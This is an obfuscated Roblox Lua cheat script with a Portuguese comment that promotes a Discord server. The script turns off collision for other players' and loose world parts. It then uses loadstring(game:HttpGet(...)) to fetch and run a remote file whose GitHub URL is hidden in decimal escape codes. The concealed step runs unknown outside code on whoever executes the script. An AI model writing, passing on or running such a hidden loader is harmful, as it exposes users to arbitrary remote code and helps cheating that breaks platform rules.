-- [[ luay o arquivo seguibte foi ofuscado por segurança caso queira o código entre no discord e impulse o servidor https://discord.gg/MwJGfBSXc9 ]]
( function (...) local RunService = game:GetService("\082\117\110\083\101\114\118\105\099\101") local Players = game:GetService("\080\108\097\121\101\114\115") local _IIIllIIIIl = Players.LocalPlayer RunService.Stepped:Connect( function () local _IllIIllIll = _IIIllIIIIl.Character if not _IllIIllIll then return end
 for _, player in pairs(Players:GetPlayers()) do if player ~= _IIIllIIIIl and player.Character then for _, parte in pairs(player.Character:GetDescendants()) do if parte:IsA("\066\097\115\101\080\097\114\116") then parte.CanCollide = false parte.Velocity = Vector3.new(0x0, 0x0, 0x0) parte.RotVelocity = Vector3.new(0x0, 0x0, 0x0) end
 end
 end
 end
 for _, objeto in pairs(workspace:GetDescendants()) do if objeto:IsA("\066\097\115\101\080\097\114\116") and not objeto.Anchored and not objeto:IsDescendantOf(_IllIIllIll) and not objeto:IsDescendantOf(workspace:FindFirstChild("\084\101\114\114\097\105\110") or workspace) then objeto.CanCollide = false end
 end
 end
 ) end
 )(...) loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\104\105\103\117\121\115\100\111\114\111\098\108\111\120\106\111\097\111\112\107\045\109\097\107\101\114\047\115\104\097\100\101\114\115\047\114\101\102\115\047\104\101\097\100\115\047\109\097\105\110\047\100\097\116\097\047\115\099\114\105\112\116\047\098\121\037\050\048\076\085\065\089\046\097\112\105"))() end
 )(...)
